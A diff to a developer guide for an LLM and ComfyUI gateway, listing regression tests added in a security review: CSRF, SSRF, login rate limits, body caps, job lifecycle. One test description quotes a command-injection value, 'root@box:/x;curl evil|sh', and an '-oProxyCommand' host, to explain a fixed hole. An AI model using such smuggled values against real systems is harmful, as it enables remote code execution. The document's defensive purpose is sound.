@@ -31,7 +31,7 @@ venv/bin/uvicorn main:app --host 0.0.0.0 --port 4000   # add --reload for dev
   restart for backend/alias changes. Read **only at startup**:
   `stats.enabled` and the stats/jobs DB paths.
 - **No linter or build step, and no blanket test suite** — only targeted stdlib
-  `unittest` files for the mechanisms that fail SILENTLY (see the thirty-three listed under
+  `unittest` files for the mechanisms that fail SILENTLY (see the fifty-six listed under
   `anthropic_bridge.py`): `venv/bin/python -m unittest discover -s tests -t .`.
   Everything else is verified by running the server and hitting endpoints with
   `curl` (README "Try it"), `curl -H "Authorization: Bearer <admin key>"
@@ -713,7 +713,7 @@ they need via injected callables, staying hot-reload-safe.
   running the tool. Covered by
   `test_anthropic_bridge.py` (stdlib `unittest` — a streaming tool-call bridge fails
   silently rather than crashing). `ls tests/test_*.py` is the count of record —
-  **thirty-three** files today — and each exists for that same reason: the mechanism it
+  **fifty-six** files today — and each exists for that same reason: the mechanism it
   guards fails SILENTLY, so it is named next to that mechanism above.
   `test_anthropic_bridge.py`, `test_prune_branch.py` (a
   dead-branch prune that cascades one node too far or too few surfaces as an aborted
@@ -830,20 +830,166 @@ they need via injected callables, staying hot-reload-safe.
   script. Confirm texts are now `data-confirm` read by the one delegated `_CONFIRM_JS`
   handler `_page` emits; JSON inside `<script>` goes through `_js_json`, which escapes
   `<`/`>`/`&` so a backend-reported model id cannot close the block).
-  `test_ui_csrf.py` (cross-site requests to /ui: ~30 console actions are plain GET links
+  `test_ui_csrf.py` (cross-site requests to /ui: console actions WERE plain GET links
   and a `samesite=lax` cookie rides on a cross-site top-level GET — any page the admin
   opened could delete users or restart a ComfyUI; bootstrap-open has no cookie at all.
-  `_ui_guard` now refuses what `_cross_site` flags — `Sec-Fetch-Site` other than
+  `_ui_guard` refuses what `_cross_site` flags — `Sec-Fetch-Site` other than
   `same-origin`/`none`, else a foreign Origin/Referer; no header at all = curl, passes —
-  with 403 for a POST and, for a GET, a page whose same-origin *Continue* link runs it, so
-  links from chat or mail still work one click later. Every /ui response carries
-  `_UI_SEC_HEADERS` (no framing, nosniff) and the cookie is `samesite=strict`).
+  with 403 for a POST and, for a GET of a VIEW, a page whose same-origin *Continue* link
+  opens it (links from chat or mail still work one click later); a foreign GET of an
+  ACTION gets no such button — actions are POST-only (`test_ui_post_only.py`). Every /ui
+  response carries `_UI_SEC_HEADERS` (no framing, nosniff), the cookie is
+  `samesite=strict`).
   `test_voice_ship_targets.py` (`voice_ref_hosts` is the one setting that reaches a
   command line — `ssh <host> "mkdir -p <dir>"` + `scp`, as root on prod — and the only
   check was "dir starts with /": `root@box:/x;curl evil|sh` ran remotely, a host
   `-oProxyCommand=…` locally, and both look like a normal ship. `main.parse_voice_target`
   holds host and dirs to plain characters BEFORE any process is spawned, and the argv
   puts `--` before the host and `shlex.quote`s the remote dir).
+  Added by the review round of 2026-09-23 (every one guards a mechanism whose failure
+  looks like a working gateway):
+  `test_ui_lock.py` (when /ui locks: `ui_locked()` used to lock on an ADMIN credential
+  only, so a gateway with nothing but `role: user` accounts had its API closed and its
+  console — pre-filled user keys included — open to the LAN, and deleting, demoting or
+  disabling the last admin silently opened it again. Pins that any user or a master key
+  locks, that `admin_change_refusal` refuses a first non-admin and the loss of the last
+  admin credential, and that an old store.db already in the "users, no admin" state stays
+  locked while the login page names `api_key` in config.yaml as the way back).
+  `test_ui_login.py` (the login form, the one unauthenticated write path into the admin
+  area: without a limit it can be guessed at any speed and each miss is an ordinary 401.
+  Pins 10 failures per IP in 5 min → 429 with `Retry-After`, even for the right key; the
+  reset on a valid login; the bounded table; and `Secure` on the cookie exactly for HTTPS
+  / `X-Forwarded-Proto: https` — never on plain LAN http, where the login would loop).
+  `test_ref_url_fetch.py` (client URLs the gateway fetches itself and keeps readable under
+  `/v1/jobs/<id>/input/<n>` — SSRF with read-back: localhost /ui, backend admin ports,
+  169.254.169.254. Pins `ref_addr_blocked` incl. v4-mapped addresses, the check of EVERY
+  resolved address, connecting to the checked IP with the original Host and SNI (no DNS
+  rebinding), no redirects, the streamed byte cap, the `ref_url_allow_cidrs` opt-in, and
+  that `images` keys that are no slot, or surplus `ref_images`, are never fetched).
+  `test_body_limit.py` (bodies are read whole and were unbounded — the first symptom is
+  the OOM kill. Pins `max_body_mb` (default 200, 0 = off), 413 on a declared
+  Content-Length and while counting a chunked body, and the console forms' own 16 MB cap).
+  `test_health_access.py` (`/health` handed anyone the whole inventory — backends with
+  hosts, model ids, aliases, balances, the fault log — on an otherwise locked gateway.
+  Pins the short form for strangers and user keys, the full view for a master/admin key
+  (Bearer or x-api-key), a /ui session and bootstrap-open, and model ids only with
+  `?verbose=1`, else `models_count`).
+  `test_rejected_log.py` (refusals are logged before or without auth with CALLER-chosen
+  strings: a 50 MB "model name" per request, or thousands of 401 rows a minute pushing
+  real calls out of LLM Calls. Pins `_clip` to `_LOG_FIELD_MAX`, x-source cut in
+  `_source_of`, and at most `_UNAUTH_LOG_PER_MIN` 401 rows per minute while other
+  refusals stay unthrottled).
+  `test_gen_limits.py` (a client `ttl_s: 10**12` kept a job on disk forever, and async
+  generation jobs — unlike parked chat calls — had no cap, sitting `queued` like a busy
+  fleet. Pins `_clamp_ttl` to `jobs.max_ttl_s` and the 503 with `Retry-After` from
+  `max_queued_gen` async jobs on, sync jobs not counted).
+  `test_mapping_values.py` (what a client value may become in a workflow: a LIST is a
+  node LINK in ComfyUI's API format and rewires the graph; a path in a mapped file field
+  reads any file ComfyUI can read — another job's output included — and delivers it as a
+  harmless-looking result. Pins that the injector skips lists and mismatched dicts,
+  `_client_param_refusal`'s 400 for stage 1 and successor, backend paths only for an
+  admin, the console, bootstrap-open or `client_path: true`, and numeric strings passing).
+  `test_audio_content_type.py` (the voice playground stash and stored call audio were
+  served from the /ui origin under the BACKEND's content type — SVG or HTML from there
+  runs script in the admin session. Pins: only `audio/*` plays, anything else is an
+  octet-stream download, `nosniff` always).
+  `test_model_lookup_allow.py` (`/v1/models/{id}` only checked that SOME key was sent; a
+  key restricted to one alias could query every alias, backend and model id. Pins
+  `_model_allowed` and a 404 outside the grant, identical to "unknown").
+  `test_backend_key_field.py` (the backend key sat as a plaintext `value` in the form, and
+  a config backend's key was missing from it, so its first Save wrote a store copy
+  WITHOUT the key — which then failed discovery on auth. Pins: never rendered, blank
+  keeps it, input replaces it, `api_key_clear` removes it, the config key is carried
+  over, the summary carries only `api_key_set`).
+  `test_service_unit.py` (the systemd sandbox for a root service: the next well-meant
+  tightening — ProtectHome, ProtectSystem=strict, dropping AF_NETLINK — breaks voice
+  shipping, DB writes or Scan network without the service failing to start. Pins both
+  halves: the hardening is there, and those three settings are not).
+  `test_jobs_lifecycle.py` (the job store's state machine: every write succeeds, so a
+  worker finishing after a cancel overwrote `failed: cancelled by user` with `done` and a
+  late `set_status("running")` resurrected a cancelled row — the console showed a stopped
+  job as delivered; and `prune_once` deleted a job still RUNNING under a short client
+  `ttl_s`, after which `complete()` wrote artifacts into a directory no row points to.
+  Pins first-terminal-write-wins on every status writer, `merge_meta` reaching a terminal
+  row, and prune touching finished jobs only).
+  `test_gen_cancel.py` (stopping exactly one job's work: ComfyUI's bare `/interrupt`
+  stops whatever executes, so cancelling a queued job or a `max_wait` on a waiting prompt
+  killed a stranger's run, which then failed over or was charged an execution fault — and
+  a SYNC job was never in `_gen_tasks`, so its cancel only relabelled the row. Pins
+  `_stop_prompt`'s targeting — running → `/interrupt {prompt_id}`, pending → `/queue
+  delete`, gone/unreadable → nothing — the cancelled `generate()` stopping its own prompt,
+  `ComfyPromptInterrupted` ending a job without failover or fault, a sync job ended by its
+  cancel with the worker unwound before cancel returns, a crashed worker failing its job
+  instead of staying `running` forever, adapters keeping their runtime state — restart
+  cooldown, prompt registry — across a backend save, and fire-and-forget tasks held until
+  done so a restart can never leave `_comfy_restarting` set).
+  `test_gen_inputs.py` (what /v1/generations makes of reference images: an `images` value
+  the gateway cannot read — a 404 URL, broken base64 — was dropped, and the job ran on
+  the slot's placeholder and came back `done` with a plausible picture of the wrong thing;
+  pins the 400 naming the slot, and that an EMPTY value still means an empty slot).
+  `test_responses_bridge.py` (the Responses↔Chat bridge always yields a well-formed
+  object, whatever it lost on the way: a streamed tool call whose `delta.tool_calls` was
+  ignored ended in a clean `response.completed` with an empty message — the agent just
+  "decided" not to call its tool; two parallel `function_call` items as two assistant
+  messages are a 400 on strict servers; a stream dying mid-way closed as `completed`
+  around the truncated text. Pins chunked, interleaved and index-less tool-call
+  fragments, the output order, `response.failed` for an exception, an in-band error and
+  an end without `finish_reason`/`[DONE]`, and the turn merge on the request side).
+  `test_chat_dispatch.py` (the chat dispatch path, where every case ends in a plausible
+  answer: a closed keep-alive connection (`RemoteProtocolError`) or a reset skipped
+  failover and the fault log and arrived as a raw 500 that Claude Code renders blank; a
+  failover after a `ReadTimeout` on a PAID backend bought the answer twice; a 300 s
+  connect timeout held failover back five minutes; an upstream dropping MID-stream cut the
+  client's connection, which reads like a finished answer. Pins the failover classes, the
+  paid-backend 504, the endpoint-shaped 502, `_CHAT_TIMEOUT`, which client headers reach
+  a backend, that an aborted or dropped stream is booked with 499/502 and its tokens (or
+  it is missing from LLM Calls and the monthly cost quota) and ends in an in-band error
+  chunk/event, and that the body is serialised exactly once).
+  `test_stats_store.py` (the call log's storage and query paths: every query returns the
+  right rows whatever plan SQLite picks, so a lost index is invisible on ten rows and
+  only shows as a Dashboard tick that slows every week — 274 ms of `GROUP BY backend` over
+  300k rows, measured. Pins the Dashboard queries' PLANS (`idx_calls_ts_backend`), the
+  body store (gzip, legacy plain blobs still read, head+tail cap, refusals without their
+  request, body retention that keeps the row), the one-INSERT write path on
+  `synchronous=NORMAL`, the in-memory month sum the cost quota reads per request, the SQL
+  partition matching `admin._call_kind` — Voice Calls used to come up empty behind 300
+  newer LLM calls — the every-source user picker, the memoised aggregates, and the Users
+  page not waiting on reverse DNS).
+  `test_comfy_discover.py` (ComfyUI discovery off the event loop: the MB-sized
+  `/object_info` parsed on the loop every 30 s — every 3 s per DOWN backend — stalls
+  every request and stream and shows as nothing but "sluggish"; pins that
+  `_parse_object_info` runs in a worker thread and that models, LoRAs, the bypass slot
+  types and the executor watchdog still come out of the same fetch).
+  `test_ui_look.py` (how the console reads, sorts and announces itself — each only shows
+  in a browser: without a viewport tag a phone renders the desktop layout at a third of
+  its size, and the media query must lift `body{overflow:hidden}` without reaching the
+  desktop, where `<main>` stays the scroll container; duplicate CSS selectors override
+  each other silently; `.muted` must reach 4.5:1; `num()` sorted "1.2 s, 10.1 s, 102 ms"
+  as TEXT (run in node, `data-sv` on call and job rows); a live chip that never says
+  stale/offline makes dead numbers look current; Media Jobs is always live, sortable, and
+  keyset-paged without gaps or duplicates; `_field` ties `label for` and puts hints on
+  their own row; no tofu glyphs; keyboard reorder; cent sums, the year only on old dates,
+  "0 / ∞"; ES5 as a syntax rule; `_JOB_TICK` starts one timer; the "all" box follows its
+  rows).
+  `test_upload_pin_migration.py` (the removed "playground upload" image pin: nothing ever
+  supplied that upload — `NormalizedRequest.upload_image` had no writer — so it always
+  ran on the placeholder. The option is gone and stored `__gw_upload__` pins are
+  rewritten to the placeholder at startup; a lost migration would send the raw string to
+  ComfyUI as a file name, so the migration, the resolver's legacy fallback and the
+  editor's option list are pinned).
+  `test_ui_post_only.py` (console actions are POST-only: a GET link fires on any
+  navigation — preview, prefetch, a pasted URL — and nothing logs the store change. Walks
+  the handlers by AST (no GET route may reach a store/jobs write or a mutating callback;
+  `_autoresolve_ips`' reverse-DNS cache is the one exception), crawls the rendered pages
+  (no link or `location.href` to an action), checks that names with `& + # %` survive
+  every action URL — the HTML escape split `a&b` into `a` + `amp;b` and ran the action on
+  another alias — and that the Mapping editor keeps typed edits across Update workflow, a
+  refused file, drag-reorder and a refused rename).
+  `test_ui_form_validation.py` (create/save forms refuse out loud and overwrite nothing: a
+  taken name used to REPLACE or MERGE the existing chat alias/user/backend/media alias,
+  and "1.5"/"-1"/"1e3" became an UNLIMITED cap or quota. Each refusal is a 400 with the
+  form re-rendered as typed, nothing is written; voice ship targets are checked on Save
+  with main's own rules).
   Run them all with `python -m unittest discover -s tests -t .` (no runner dependency).
 - **`openai_image_bridge.py`** — pure request/response plumbing for the OpenAI
   image shims (`multipart_list`, `parse_size`, `coerce_scalar`, `images_uploads`
